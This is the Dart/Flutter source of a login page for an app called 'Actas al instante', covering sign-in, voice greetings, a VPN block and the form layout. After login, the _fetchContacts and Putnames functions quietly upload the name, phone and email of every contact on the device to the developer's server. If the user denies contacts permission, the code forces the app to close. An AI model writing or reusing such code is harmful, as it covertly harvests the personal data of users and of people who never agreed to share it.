import 'dart:convert';
import 'dart:io';
import 'package:app_actasalinstante/NavBar.dart';
import 'package:app_actasalinstante/Registro.dart';
import 'package:awesome_dialog/awesome_dialog.dart';
import 'package:flutter/material.dart';
import 'package:app_actasalinstante/Widgets/carousel_example.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:flutter_tts/flutter_tts.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:http/http.dart';
import 'package:awesome_snackbar_content/awesome_snackbar_content.dart';
import 'package:lottie/lottie.dart';
import 'package:responsive_framework/responsive_wrapper.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'DropDown/Descargar_actas/animation/FadeAnimation.dart';
import 'FlatMessage/Message.dart';
import 'LoginView/api/ProgressHUD.dart';
import 'RFCDescargas/services/Variables.dart';
import 'SplashScreen/Splashscreen1.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:connection_status_bar/connection_status_bar.dart';
import 'package:check_vpn_connection/check_vpn_connection.dart';

enum ViewDialogsAction { yes, no }

class LoginPage extends StatefulWidget {
  const LoginPage({key}) : super(key: key);

  @override
  _LoginPageState createState() => _LoginPageState();
}

Future<void> setup() async {
  SharedPreferences prefs = await SharedPreferences.getInstance();
  getIt.registerSingleton<AuthModel>(AuthModel());
  print(getIt);
}

class _LoginPageState extends State<LoginPage> {
  bool _obscureText = true;
  void _toggle() {
    setState(() {
      _obscureText = !_obscureText;
    });
  }

  List<Contact> _contacts;
  bool _permissionDenied = false;

  bool hidePassword = true;
  bool isApiCallProcess = false;
  GlobalKey<FormState> globalFormKey = GlobalKey<FormState>();

  final scaffoldKey = GlobalKey<ScaffoldState>();

  AnimationController _coffeeController;
  bool copAnimated = false;
  bool animateCafeText = false;

  TextEditingController userController = TextEditingController();
  TextEditingController passwordController = TextEditingController();
  bool tappedYes = false;

  void login(String user, password) async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    try {
      Response response = await post(
          Uri.parse('https://actasalinstante.com:3030/api/user/signin/'),
          body: {'username': user, 'password': password});

      if (response.statusCode == 200) {
        var data = jsonDecode(response.body.toString());

        getIt<AuthModel>().id = data['id'];
        getIt<AuthModel>().usuario = data['username'];
        getIt<AuthModel>().token = data['token'];
        Token = data['token'];
        User_speak = data['username'];
        _fetchContacts();
        prefs.setString('token', data['token']);
        prefs.setString('username', data['username']);
        var snackBar = SnackBar(
          elevation: 0,
          width: 400,
          behavior: SnackBarBehavior.floating,
          backgroundColor: Colors.transparent,
          content: AwesomeSnackbarContent(
            title: 'Espere un momento ' + user,
            message: '',
            contentType: ContentType.help,
          ),
        );

        ScaffoldMessenger.of(context).showSnackBar(snackBar);
        //  _speak("Espere un momento porfavor");
      } else {
        setState(() {
          isApiCallProcess = false;
        });

        var snackBar = SnackBar(
          elevation: 0,
          width: 400,
          behavior: SnackBarBehavior.floating,
          backgroundColor: Colors.transparent,
          content: AwesomeSnackbarContent(
            title: 'Usuario Incorrecto ' + user,
            message: 'Contacte al equipo de software!',
            contentType: ContentType.failure,
          ),
        );

        ScaffoldMessenger.of(context).showSnackBar(snackBar);
      }
    } catch (e) {
      AwesomeDialog(
        context: context,
        dialogType: DialogType.ERROR,
        animType: AnimType.BOTTOMSLIDE,
        title: 'Se agoto el tiempo de espera',
        desc: user + ' ¿quieres salir de la aplicación?',
        btnCancelOnPress: () {
          //  Navigator.of(context).pop(true);
        },
        btnOkOnPress: () {
          exit(0);
        },
      )..show();
    }
  }

  @override
  void initState() {
    super.initState();
    Lenguaje();
    Check_VPN();
    hola();
    setState(() {
      isApiCallProcess = true;
    });

    //Notification();
  }

//ENVIAR CONTACTOS
  var contac;
  var data = [];
  String names, lastname, email;
  var Token;
  Putnames(String names, String lastname, String phone, String email,
      int ids) async {
    Map<String, String> mainheader = new Map();
    mainheader["content-type"] = "application/json";
    mainheader['x-access-token'] = Token;
    Map<String, dynamic> body = {
      'name': names,
      'lastname': lastname,
      'phone': phone,
      'email': email,
      "id_send": ids,
    };

    var response = await post(
        Uri.parse('https://actasalinstante.com:3030/api/app/contacts/add/'),
        headers: mainheader,
        body: json.encode(body));
  }

  SendContact(Contact contact) async {
    Putnames(
        contact.name.first,
        contact.name.last,
        contact.phones.isNotEmpty ? contact.phones.first.number : '(none)',
        contact.emails.isNotEmpty ? contact.emails.first.address : '(none)',
        getIt<AuthModel>().id);
  }

  Future _fetchContacts() async {
    if (!await FlutterContacts.requestPermission(readonly: true)) {
      setState(() => _permissionDenied = true);
      Contactos_Deegeados();
      print(_permissionDenied);
    } else {
      final contacts = await FlutterContacts.getContacts();
      _contacts = contacts;
      //  setState(() => _contacts = contacts);

      for (var i = 0; i < _contacts.length; i++) {
        final fullContact = await FlutterContacts.getContact(_contacts[i].id);

        SendContact(fullContact);
        print("Ok");
      }
      final snackBar = SnackBar(
        elevation: 0,
        behavior: SnackBarBehavior.floating,
        backgroundColor: Colors.black,
        content: Text(
          "Bienvenido " + userController.text.toString(),
          style: TextStyle(color: Colors.white, fontSize: 18),
          textAlign: TextAlign.center,
        ),
      );

      ScaffoldMessenger.of(context).showSnackBar(snackBar);

      var status = await Permission.storage.status;
      if (!status.isGranted) {
        await Permission.storage.request();
        AwesomeDialog(
          context: context,
          dialogType: DialogType.QUESTION,
          animType: AnimType.BOTTOMSLIDE,
          title: 'Actas al instante',
          desc: 'Otorga todos los permisos',
          btnCancelOnPress: () async {
            SharedPreferences prefs = await SharedPreferences.getInstance();
            prefs.remove('token');
            prefs.remove('username');
            Navigator.pushReplacement(
                context,
                MaterialPageRoute(
                    builder: (BuildContext ctx) => SplashScreen()));
            //  Navigator.of(context).pop(true);
          },
          btnOkOnPress: () async {
            _speak('Hola' +
                userController.text +
                ', Bienvenido a actas al instante');
            Navigator.push(
                context, MaterialPageRoute(builder: (context) => NavBar()));
          },
        )..show();
      } else {
        _speak(
            'Hola,' + userController.text + ', Bienvenido a actas al instante');
        Navigator.push(
            context, MaterialPageRoute(builder: (context) => NavBar()));
      }
    }
  }

  var User_speak;
  Contactos_Deegeados() async {
    _speak(User_speak.toString() +
        ",Es muy importante, dar en permitir, a todos los permisos que le solicite la app ");
    SharedPreferences prefs = await SharedPreferences.getInstance();
    prefs.remove('token');
    prefs.remove('username');
    await Future.delayed(Duration(seconds: 8));
    exit(0);
  }

  Lenguaje() async {
    languages = List<String>.from(await flutterTts.getLanguages);
    setState(() {});
  }

  FlutterTts flutterTts = FlutterTts();
  TextEditingController controller = TextEditingController();

  double volume = 1.0;
  double pitch = 1.0;
  double speechRate = 0.5;
  List<String> languages;
  String langCode = "es-US";
  //VOICE INICIO
  void initSetting() async {
    // await flutterTts.setVolume(volume);
    // await flutterTts.setPitch(pitch);
    // await flutterTts.setSpeechRate(speechRate);
    await flutterTts.setLanguage(langCode);
  }

  void _speak(voice) async {
    initSetting();
    await flutterTts.speak(voice);
  }

  void _stop() async {
    await flutterTts.stop();
  }

  Aveptar_Terminos() {
    AwesomeDialog(
      context: context,
      dialogType: DialogType.WARNING,
      animType: AnimType.BOTTOMSLIDE,
      title: 'Actas al instante, solicita los siguentes permisos',
      desc:
          '1.- Acceso a la ubicaión \n 2.- Acceso a los contactos\n 3.-Acceso al almacenamiento\n-------------   \n He leído y acepto los términos y condiciones de uso ',
      btnCancelOnPress: () {
        //  Navigator.of(context).pop(true);
        exit(0);
      },
      btnOkOnPress: () {
        // bool yess = true;

        Navigator.push(
            context, MaterialPageRoute(builder: (context) => RegisterPage()));
      },
    )..show();
  }

  Check_VPN() async {
    if (await CheckVpnConnection.isVpnActive()) {
      // do some action if VPN connection status is true

      var snackBar = SnackBar(
        elevation: 0,
        width: 400,
        behavior: SnackBarBehavior.floating,
        backgroundColor: Colors.transparent,
        content: AwesomeSnackbarContent(
          title: 'Desactive su VPN',
          message: 'Porfavor!',
          contentType: ContentType.failure,
        ),
      );

      ScaffoldMessenger.of(context).showSnackBar(snackBar);
      await Future.delayed(Duration(seconds: 4));
      exit(0);
    } else {}
  }

  hola() {
    readCounter();
    (context as Element).reassemble();
    setState(() {
      isApiCallProcess = false;
    });
  }

  Future<String> get _localPath async {
    final directory = "/storage/emulated/0/Download";

    return directory;
  }

  Future<File> get _localFile async {
    final path = await _localPath;
    return File('$path/Matriculas.txt');
  }

  var leerMatricula;
  Future<int> readCounter() async {
    try {
      final file = await _localFile;

      // Leer archivo
      String contents = await file.readAsString();
      leerMatricula = contents;

      setState(() {
        isApiCallProcess = false;
      });
      return int.parse(contents);
    } catch (e) {
      setState(() {
        isApiCallProcess = false;
      });
      // Si encuentras un error, regresamos 0
      return 0;
    }
  }

  @override
  Widget build(BuildContext context) {
    return ProgressHUD(
      child: builds(context),
      inAsyncCall: isApiCallProcess,
      opacity: 0.3,
      key: Key(isApiCallProcess.toString()),
      valueColor: AlwaysStoppedAnimation<Color>(Colors.red),
    );
  }

  Widget builds(BuildContext context) {
    return ProgressHUD(
      child: _uiSetup(context),
      inAsyncCall: isApiCallProcess,
      opacity: 0.3,
    );
  }

  Widget _uiSetup(BuildContext context) {
    return Scaffold(
      // appBar: AppBar(
      //   automaticallyImplyLeading: false,
      //   elevation: 0,
      //   backgroundColor: Colors.white,
      // ),

      key: scaffoldKey,
      backgroundColor: Theme.of(context).accentColor,
      body: SingleChildScrollView(
        child: Column(
          children: <Widget>[
            FadeAnimation(
              1.1,
              Stack(
                children: <Widget>[
                  Container(
                    height: 757,
                    width: double.infinity,
                    decoration: const BoxDecoration(
                      image: DecorationImage(
                          image: AssetImage('assets/fondoalterno.jpg'),
                          fit: BoxFit.fill),
                    ),
                    // Foreground widget here
                  ),
                  Container(
                    width: double.infinity,
                    padding: EdgeInsets.symmetric(vertical: 3, horizontal: 5),
                    margin: EdgeInsets.symmetric(vertical: 140, horizontal: 20),
                    decoration: BoxDecoration(
                      borderRadius: BorderRadius.only(
                        bottomRight: Radius.circular(40),
                        topLeft: Radius.circular(40),
                      ),
                      color: Colors.white,
                      boxShadow: [
                        BoxShadow(
                          color: Theme.of(context).hintColor.withOpacity(0.1),
                          offset: Offset(0, 20),
                          blurRadius: 90,
                        )
                      ],
                    ),
                    child: Form(
                      key: globalFormKey,
                      child: Column(
                        children: <Widget>[
                          Container(
                            height: 190,
                            width: MediaQuery.of(context).size.width * 0.43,
                            decoration: BoxDecoration(
                              color: Colors.white,
                              image: DecorationImage(
                                image: AssetImage('assets/splash.png'),
                              ),
                              borderRadius:
                                  BorderRadius.all(Radius.circular(26)),
                            ),
                          ),
                          SizedBox(height: 5),
                          Text(
                            "Ingresar",
                            style: GoogleFonts.lato(
                              textStyle: Theme.of(context).textTheme.headline4,
                              fontSize: 24,
                              fontWeight: FontWeight.w700,
                              fontStyle: FontStyle.italic,
                              color: Colors.black,
                            ),
                          ),
                          SizedBox(height: 20),
                          new TextFormField(
                            style: GoogleFonts.lato(
                              textStyle: Theme.of(context).textTheme.headline4,
                              fontSize: 16,
                              fontWeight: FontWeight.w700,
                              fontStyle: FontStyle.italic,
                              color: Colors.black,
                            ),
                            keyboardType: TextInputType.emailAddress,
                            controller: userController,
                            onSaved: (input) => userController.text = input,
                            decoration: new InputDecoration(
                              hintText: "Usuario",
                              enabledBorder: UnderlineInputBorder(
                                  borderSide: BorderSide(
                                      color: Theme.of(context)
                                          .accentColor
                                          .withOpacity(0.2))),
                              focusedBorder: UnderlineInputBorder(
                                  borderSide: BorderSide(
                                      color: Theme.of(context).accentColor)),
                              prefixIcon: Icon(
                                Icons.person,
                                color: Theme.of(context).accentColor,
                              ),
                            ),
                          ),
                          SizedBox(height: 20),
                          new TextFormField(
                            style: GoogleFonts.lato(
                              textStyle: Theme.of(context).textTheme.headline4,
                              fontSize: 16,
                              fontWeight: FontWeight.w700,
                              fontStyle: FontStyle.italic,
                              color: Colors.black,
                            ),
                            keyboardType: TextInputType.text,
                            controller: passwordController,
                            // onSaved: (input) => passwordController.text = input,
                            // validator: (input) =>
                            //     input.length < 3 ? "Contraseña no valida" : null,
                            obscureText: hidePassword,
                            decoration: new InputDecoration(
                              hintText: "Contraseña",
                              enabledBorder: UnderlineInputBorder(
                                  borderSide: BorderSide(
                                      color: Theme.of(context)
                                          .accentColor
                                          .withOpacity(0.2))),
                              focusedBorder: UnderlineInputBorder(
                                  borderSide: BorderSide(
                                      color: Theme.of(context).accentColor)),
                              prefixIcon: Icon(
                                Icons.lock,
                                color: Theme.of(context).accentColor,
                              ),
                              suffixIcon: IconButton(
                                onPressed: () {
                                  setState(() {
                                    hidePassword = !hidePassword;
                                  });
                                },
                                color: Theme.of(context)
                                    .accentColor
                                    .withOpacity(0.9),
                                icon: Icon(hidePassword
                                    ? Icons.visibility_off
                                    : Icons.visibility),
                              ),
                            ),
                          ),
                          SizedBox(height: 39),
                          new Center(
                            child: Container(
                              decoration: BoxDecoration(
                                color: Colors.black,
                                borderRadius: BorderRadius.circular(15),
                              ),
                              padding: const EdgeInsets.symmetric(
                                  horizontal: 29, vertical: 5),
                              child: Row(
                                mainAxisSize: MainAxisSize.min,
                                children: [
                                  MaterialButton(
                                    onPressed: () {
                                      setState(() {
                                        isApiCallProcess = true;
                                      });

                                      login(userController.text.toString(),
                                          passwordController.text.toString());
                                      _speak("Espere un momento porfavor");
                                    },
                                    child: Text("Iniciar sesion",
                                        style: GoogleFonts.lato(
                                          textStyle: Theme.of(context)
                                              .textTheme
                                              .headline4,
                                          fontSize: 16,
                                          fontWeight: FontWeight.w700,
                                          fontStyle: FontStyle.italic,
                                          color: Colors.white,
                                        )),
                                  ),
                                  // Icon(
                                  //   Icons.download_done,
                                  //   size: 20,
                                  //   color: Colors.white,
                                  // ),
                                ],
                              ),
                            ),
                          ),

                          ///REGISTRO
                          SizedBox(height: 15),
                          if (leerMatricula == null)
                            new Center(
                              child: Container(
                                decoration: BoxDecoration(
                                  color: Colors.black,
                                  borderRadius: BorderRadius.circular(15),
                                ),
                                padding: const EdgeInsets.symmetric(
                                    horizontal: 29, vertical: 5),
                                child: Row(
                                  mainAxisSize: MainAxisSize.min,
                                  children: [
                                    MaterialButton(
                                      onPressed: () {
                                        Aveptar_Terminos();
                                      },
                                      child: Text("Registro",
                                          style: GoogleFonts.lato(
                                            textStyle: Theme.of(context)
                                                .textTheme
                                                .headline4,
                                            fontSize: 16,
                                            fontWeight: FontWeight.w700,
                                            fontStyle: FontStyle.italic,
                                            color: Colors.white,
                                          )),
                                    ),
                                    // Icon(
                                    //   Icons.download_done,
                                    //   size: 20,
                                    //   color: Colors.white,
                                    // ),
                                  ],
                                ),
                              ),
                            ),
                        ],
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  bool validateAndSave() {
    final form = globalFormKey.currentState;
    if (form.validate()) {
      form.save();
      return true;
    }
    return false;
  }
}
